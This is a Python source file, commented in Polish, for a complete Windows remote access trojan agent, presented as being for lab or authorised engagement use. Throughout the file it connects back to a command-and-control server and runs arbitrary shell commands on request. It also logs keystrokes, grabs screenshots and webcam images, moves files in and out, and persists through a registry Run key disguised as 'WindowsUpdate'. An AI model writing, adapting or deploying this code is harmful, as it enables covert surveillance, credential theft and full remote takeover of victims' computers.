# language: Python, file: agent.py, runtime: Python 3.10+, target: Windows 10/11 (VM/lab)
# RAT agent — łączy się z C2, wykonuje komendy, keylogger, screenshot, upload/download, persistence
# użytek: edukacja / lab / engagement z podpisanym scope
import socket
import subprocess
import os
import sys
import time
import threading
import platform
import uuid
import base64
import io

C2_HOST = "192.168.1.100"   # <-- ZMIEŃ na IP swojego C2
C2_PORT = 4444
BUFFER = 4096
MARKER = b"\n\n"

# ---------- keylogger (globalny stan) ----------
_keylog_buffer = []
_keylog_running = False

# ---------- sysinfo ----------

def sysinfo():
    info = {
        "hostname": socket.gethostname(),
        "user": os.environ.get("USERNAME", os.environ.get("USER", "?")),
        "os": platform.platform(),
        "arch": platform.machine(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "mac": ":".join([f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8)][::-1]),
        "cwd": os.getcwd(),
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items())

# ---------- keylogger (Windows: ctypes GetAsyncKeyState) ----------

def _keylog_loop():
    global _keylog_running
    import ctypes
    user32 = ctypes.windll.user32
    special = {8: "[BS]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]", 32: " ", 37: "[LEFT]",
               38: "[UP]", 39: "[RIGHT]", 40: "[DOWN]", 46: "[DEL]"}
    try:
        while _keylog_running:
            for vk in range(8, 256):
                if user32.GetAsyncKeyState(vk) & 0x0001:
                    if vk in special:
                        _keylog_buffer.append(special[vk])
                    elif 32 <= vk <= 126:
                        shift = user32.GetAsyncKeyState(0x10) & 0x8000
                        ch = chr(vk)
                        if shift:
                            ch = ch.upper()
                        _keylog_buffer.append(ch)
            time.sleep(0.01)
    except Exception:
        pass

def keylog_start():
    global _keylog_running
    if _keylog_running:
        return "keylogger już działa"
    _keylog_running = True
    t = threading.Thread(target=_keylog_loop, daemon=True)
    t.start()
    return "keylogger wystartował"

def keylog_stop():
    global _keylog_running
    _keylog_running = False
    return "keylogger zatrzymany"

def keylog_dump():
    global _keylog_buffer
    data = "".join(_keylog_buffer)
    _keylog_buffer = []
    return data if data else "(pusto)"

# ---------- screenshot ----------

def screenshot():
    try:
        from PIL import ImageGrab
    except ImportError:
        return "ERR: brak Pillow (pip install pillow)"
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return base64.b64encode(buf.getvalue()).decode()

# ---------- webcam ----------

def webcam():
    try:
        import cv2
    except ImportError:
        return "ERR: brak OpenCV (pip install opencv-python)"
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return "ERR: nie mogę odczytać kamery"
    ok, buf = cv2.imencode(".jpg", frame)
    if not ok:
        return "ERR: encode fail"
    return base64.b64encode(buf.tobytes()).decode()

# ---------- persistence (HKCU Run) ----------

def persist():
    try:
        import winreg
    except ImportError:
        return "ERR: brak winreg (Windows only)"
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    script = os.path.abspath(sys.argv[0])
    pythonw = sys.executable.replace("python.exe", "pythonw.exe")
    cmd = f'"{pythonw}" "{script}"'
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        return f"persistence OK: {cmd}"
    except Exception as e:
        return f"ERR: {e}"

# ---------- command dispatch ----------

def run_shell(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60)
        return out.decode(errors="replace")
    except subprocess.CalledProcessError as e:
        return e.output.decode(errors="replace")
    except subprocess.TimeoutExpired:
        return "ERR: timeout"
    except Exception as e:
        return f"ERR: {e}"

def handle(cmd):
    cmd = cmd.strip()
    if not cmd:
        return ""

    if cmd == "sysinfo":
        return sysinfo()
    if cmd == "ls" or cmd == "dir":
        try:
            return "\n".join(os.listdir("."))
        except Exception as e:
            return f"ERR: {e}"
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd[3:].strip())
            return f"cwd: {os.getcwd()}"
        except Exception as e:
            return f"ERR: {e}"
    if cmd.startswith("shell "):
        return run_shell(cmd[6:])
    if cmd == "keylog_start":
        return keylog_start()
    if cmd == "keylog_stop":
        return keylog_stop()
    if cmd == "keylog_dump":
        return keylog_dump()
    if cmd == "screenshot":
        return screenshot()
    if cmd == "webcam":
        return webcam()
    if cmd == "persist":
        return persist()
    return f"ERR: nieznana komenda '{cmd}'"

# ---------- upload / download handlers ----------

def recv_until(sock, marker=MARKER):
    data = b""
    while marker not in data:
        chunk = sock.recv(BUFFER)
        if not chunk:
            break
        data += chunk
    return data

def do_download(sock, remote_path):
    if not os.path.isfile(remote_path):
        return f"ERR: brak pliku {remote_path}"
    size = os.path.getsize(remote_path)
    sock.sendall(f"OK {size}\n\n".encode())
    with open(remote_path, "rb") as f:
        while True:
            chunk = f.read(BUFFER)
            if not chunk:
                break
            sock.sendall(chunk)
    return ""  # nic więcej nie wysyłamy

def do_upload(sock, remote_name, size):
    sock.sendall(b"READY\n\n")
    local = os.path.join(os.getcwd(), remote_name)
    received = 0
    with open(local, "wb") as f:
        while received < size:
            chunk = sock.recv(min(BUFFER, size - received))
            if not chunk:
                break
            f.write(chunk)
            received += len(chunk)
    return f"upload OK: {local} ({received} B)"

# ---------- main loop ----------

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            break
        except Exception:
            time.sleep(5)

    # banner
    s.sendall((sysinfo() + "\n\n").encode())

    while True:
        try:
            data = recv_until(s)
        except Exception:
            break
        if not data:
            break

        cmd = data.replace(MARKER, b"").decode(errors="replace").strip()

        if cmd == "exit":
            s.close()
            return

        if cmd.startswith("download "):
            remote = cmd.split(" ", 1)[1]
            resp = do_download(s, remote)
            if resp:
                s.sendall((resp + "\n\n").encode())
            continue

        if cmd.startswith("upload "):
            parts = cmd.split()
            if len(parts) != 3:
                s.sendall(b"ERR: zla skladnia upload\n\n")
                continue
            try:
                size = int(parts[2])
            except ValueError:
                s.sendall(b"ERR: zly rozmiar\n\n")
                continue
            resp = do_upload(s, parts[1], size)
            s.sendall((resp + "\n\n").encode())
            continue

        out = handle(cmd)
        if not out:
            out = "(brak outputu)"
        s.sendall((out + "\n\n").encode())

if __name__ == "__main__":
    main()